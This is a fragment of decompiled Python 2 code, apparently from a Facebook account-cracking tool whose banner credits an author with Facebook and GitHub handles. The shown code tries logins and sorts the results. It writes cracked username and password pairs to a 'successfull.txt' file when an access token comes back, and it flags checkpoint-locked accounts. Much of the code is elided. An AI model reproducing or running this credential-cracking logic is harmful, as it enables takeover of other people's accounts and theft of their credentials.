...
# Compiled at: 2022-01-14 10:01:00
...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : SAIFUR RAHMAN'
    print 'FACEBOOK : facebook.com/abbu.2454'
    print 'GITHUB     : github.com/saifur2454'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[SR-OKAY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[SR-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 15 Days]\x1b[0m \n'
